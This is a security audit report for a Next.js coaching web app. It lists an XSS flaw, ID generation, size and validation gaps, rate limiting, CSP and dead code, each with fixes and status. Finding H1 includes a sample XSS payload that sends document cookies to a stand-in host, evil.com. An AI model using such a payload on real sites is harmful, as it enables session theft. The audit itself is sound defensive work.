## High

### H1 — XSS in admin action page (user name unescaped in HTML response)
**File:** `src/app/api/admin/users/action/route.ts:30,36,41,44`

`user.name` and `user.email` are fetched from the database and interpolated directly into a raw HTML string returned to the browser:

```typescript
return new Response(html(`${user.name || user.email} is already approved.`, "info"), ...);
```

The `html()` function does not escape its `message` argument. A user who signs up via Google OAuth with a display name containing HTML (e.g., `<script>fetch('https://evil.com?c='+document.cookie)</script>`) would have that injected into the HTML page that the admin sees when clicking an approve/reject link from their email. The endpoint is in `PUBLIC_PATHS` so no session is required to trigger the render — but the actual injection only fires for the admin who clicks the link.

**Risk:** An attacker who creates an account with a crafted Google display name can execute arbitrary JavaScript in the admin's browser context when the admin approves or rejects that account, potentially stealing the admin session cookie (though `HttpOnly` mitigates the cookie theft vector specifically).

**Fix:** HTML-escape the `message` parameter before interpolating into the template. A minimal escape function:

```typescript
function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
// In html(): <p ...>${escapeHtml(message)}</p>
```

**Status: FIXED** — see commit in this audit.

## Medium

### M1 — Fragile player ID generation in `Onboarding.tsx` (missed in last audit)
**File:** `src/components/Onboarding.tsx:111-112`

The prior audit fixed `page.tsx` to use `crypto.randomUUID()` for new player IDs, but `Onboarding.tsx` was not updated and still uses the fragile `parseInt` / `Math.max` pattern:

```typescript
const maxId = prev.length > 0 ? Math.max(...prev.map((p) => parseInt(p.id))) : 0;
const newId = String(maxId + 1);
```

If any existing player ID is non-numeric (e.g., a UUID from `page.tsx`'s add-player path, or a future roster import), `parseInt` returns `NaN`, `Math.max(NaN)` returns `NaN`, and all new Onboarding players get id `"NaN"`, breaking lookup-by-id across the component.

This path is the initial onboarding flow — it runs for every new coach and produces IDs that will be persisted to the database. When those coaches later add players via the main app (which uses UUIDs), the ID collision would be immediate.

**Fix:** Use `crypto.randomUUID()` for the new player ID, matching `page.tsx`:

```typescript
const newId = crypto.randomUUID();
```

**Status: FIXED** — see commit in this audit.

### M2 — `logoDataUrl` has no size limit in roster PUT
**File:** `src/app/api/roster/route.ts:112-113`

The roster `PUT` handler accepts `config.logoDataUrl` and stores it in `teams.logo_data_url` without a size check. A base64-encoded PNG can be several megabytes. This inflates every DB row for the team, can hit Neon row/transaction size limits, and slows all team reads that return the config blob.

**Recommended fix:** Cap `logoDataUrl` at ~400 KB (base64) at the API layer:

```typescript
if (config?.logoDataUrl !== undefined) {
  if (typeof config.logoDataUrl === "string" && config.logoDataUrl.length > 400_000) {
    return NextResponse.json({ error: "Logo image too large (max ~300 KB)" }, { status: 413 });
  }
  teamUpdates.logoDataUrl = config.logoDataUrl;
}
```

**Status: NOT FIXED** — requires product decision on acceptable size threshold.

### M3 — Admin PATCH does not validate email format on update
**File:** `src/app/api/admin/users/route.ts:129`

The `POST` endpoint for creating a user validates email format with a regex, but the `PATCH` handler skips that check:

```typescript
if (email !== undefined) updates.email = email.toLowerCase().trim();
```

An admin can update any user's email to an invalid/empty string or a very long value, breaking downstream email delivery and potentially violating the unique-email constraint in confusing ways.

**Recommended fix:** Apply the same regex check (`/^[^\s@]+@[^\s@]+\.[^\s@]+$/`) and trim before updating, matching the `POST` path.

**Status: NOT FIXED** — only admins can call `PATCH`, so impact is limited, but a correctness gap.

### M4 — No rate limiting on AI and Spotify endpoints
**Files:** `src/app/api/practice/generate-station/route.ts`, `src/app/api/spotify/sync-playlist/route.ts`

Both endpoints make expensive third-party API calls with no throttling. Any approved user can hammer them:
- `/api/practice/generate-station`: each call consumes Anthropic tokens (Haiku 4.5, `max_tokens: 600`).
- `/api/spotify/sync-playlist`: each call makes multiple Spotify API calls (probe + create/update + replace tracks) and can be triggered repeatedly by clicking Generate.

**Recommended fix:** Add per-user rate limiting via a lightweight KV counter (Vercel KV / Upstash Redis). For the Spotify sync specifically, a server-side 60-second cooldown per team would prevent most abuse with minimal complexity.

**Status: NOT FIXED** — requires infrastructure decision.

## Low

### L1 — No Content-Security-Policy header
**File:** `next.config.ts`

The app sets `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy` but no `Content-Security-Policy`. A CSP would provide meaningful defense-in-depth against XSS (especially relevant given H1 above), particularly for the OAuth redirect flows and player name rendering.

**Recommended fix:** Add a `Content-Security-Policy` header in `next.config.ts`. Start with `Content-Security-Policy-Report-Only` to identify violations before enforcing. A restrictive policy for this app would allow `self` for scripts/styles and `open.spotify.com` / `i.scdn.co` for images.

**Status: NOT FIXED** — requires careful crafting to avoid breaking inline styles, Next.js scripts, and Spotify image URLs.

### L2 — `practice-pdf.ts` duplicates `loadPennant` with its own cache
**File:** `src/lib/practice-pdf.ts:8-27`

`practice-pdf.ts` defines its own local `loadPennant()` function with its own `pennantCache` variable, rather than importing the exported version from `pdf.ts`. This means two separate fetches of `/logo.png` may occur if both PDF types are generated in the same session, and cache invalidation is split across two module-scoped variables.

**Recommended fix:** Remove the local copy and `import { loadPennant } from "./pdf"`.

**Status: NOT FIXED** — minor correctness/duplication issue, low risk.

### L3 — `constraint_overrides` table is dead code
**File:** `src/lib/schema.ts:77-83`

The `constraintOverrides` table exists in the schema and migrations but is never read or written by any route or UI component. Constraint state lives in `teams.constraintConfig` JSON.

**Recommended fix:** Remove via a `DROP TABLE constraint_overrides` migration and remove the `constraintOverrides` export from `schema.ts`.

**Status: NOT FIXED** — requires a migration; safe to do on next scheduled maintenance.

## Notes

- **No hardcoded secrets found.** All credentials (`SESSION_SECRET`, `GOOGLE_CLIENT_ID`, `ANTHROPIC_API_KEY`, `RESEND_API_KEY`, `SPOTIFY_CLIENT_ID`, `SPOTIFY_CLIENT_SECRET`) are read from `process.env`.
- **SQL injection:** All DB queries use Drizzle ORM's parameterized queries. No raw string interpolation in SQL found.
- **OAuth state forgery:** Both Google and Spotify flows use HMAC-signed state with a nonce cookie — CSRF on the OAuth flow is well-mitigated.
- **Playoff mode (new since last audit):** Purely client-side. No new API surface, no new DB writes, no new auth paths. The `playoffMode` boolean in `ConstraintConfig` is stored as part of `teams.constraintConfig` JSON, which already goes through the roster `PUT` validation path.
- **Admin token expiry:** The HMAC-signed admin action tokens (`/api/admin/users/action?token=…`) carry an `exp` field and are verified in `action/route.ts:19`. Expiry is correctly enforced server-side.
